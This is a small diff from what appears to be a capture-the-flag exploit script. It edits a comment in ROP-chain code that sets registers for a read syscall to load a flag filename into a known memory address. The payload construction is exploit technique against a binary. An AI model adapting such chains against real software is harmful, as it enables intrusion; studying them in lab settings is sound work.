@@ -26,7 +26,7 @@ data_section="0x404500"
 
 rax = 0x00 # read syscall
 rdi = 0x00 # read from stdin
-rsi = int(data_section, 16) # known memory address where flag's filename and flag content gets copied
+rsi = int(data_section, 16) # known memory address where flag's filename and later flag content gets copied
 rdx = 0x08 # 8B flag
 payload = pad + p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # read syscall
 
